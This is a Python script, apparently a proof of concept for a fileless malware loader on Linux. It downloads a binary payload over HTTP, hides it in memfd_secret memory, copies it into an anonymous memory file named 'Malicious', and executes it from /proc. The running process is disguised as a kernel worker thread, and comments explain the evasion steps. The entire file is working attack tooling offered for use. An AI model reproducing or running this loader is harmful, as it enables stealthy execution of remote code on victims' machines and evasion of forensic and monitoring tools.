from ctypes import *
import requests
import subprocess
import time
import mmap
import os
import sys

class InMemExec():
    libc = CDLL(None)
    syscall = libc.syscall

    def __init__(self,http_server,time_to_sleep):
        resp = requests.get(http_server)
        self.tts = time_to_sleep
        self.payload = resp.content
        self.payload_len = len(self.payload)

    def memfd_secret(self,flags):
        return self.syscall(447,flags)

    def truncate_memory(self,fd,payload_len):
        os.ftruncate(fd,payload_len)

    def copy_memory(self,fd,payload_len):
        mm = mmap.mmap(fd,length=0,flags=mmap.MAP_SHARED,access=mmap.ACCESS_WRITE,offset=0)
        mm.write(self.payload)
        mm.seek(0)
        return mm

if __name__ == "__main__":
    pid = os.getpid()
    p = InMemExec("http://localhost:4000/payload",5)
    if p.payload_len > 65000:
        '''
        Max size for mmap is 65k by default cause of linux stuff.
        can be circumvented by making payload use memfc_create since we dont need use mmap we can just exec the file descriptor
        '''
        print("::: Payload too big! mmap default max size 65k bytes :::")
        sys.exit()
    print("::: Attempting To Create Secret Memory :::")
    fd = p.memfd_secret(0)
    if fd < 0:
        print("::: Failed to create secret memory :::")
        sys.exit()
    print(f"::: PID {pid} FileDescriptor to secret memory -> {fd} ! :::")
    p.truncate_memory(fd,p.payload_len)
    mapped_mem = p.copy_memory(fd , p.payload_len)
    print("::: Copied payload into mapped secret memeory ! :::")
    print(f"::: Sleeping for {p.tts} seconds :::")
    time.sleep(p.tts)
    print("::: Using memfd_create now to execute binary :::")
    '''
    created new fd with anonymous ram mem since we cant execute secret mem directly
    '''
    new_fd = os.memfd_create("Malicious",os.MFD_CLOEXEC)
    bytes_written = os.write(new_fd,mapped_mem[::])
    print(f"::: Copied {bytes_written} from secret to new fd :::")
    print("::: Executing... :::")
    '''
    binary executed downloaded and saved to secret memory
    then when ready copied to ram anon not secret mem and executed
    process name is [kworker/u!0]
    '''
    subprocess.Popen(["[kworker/u!0]"],-1,f"/proc/{pid}/fd/{new_fd}")
    print("::: Done! :::")
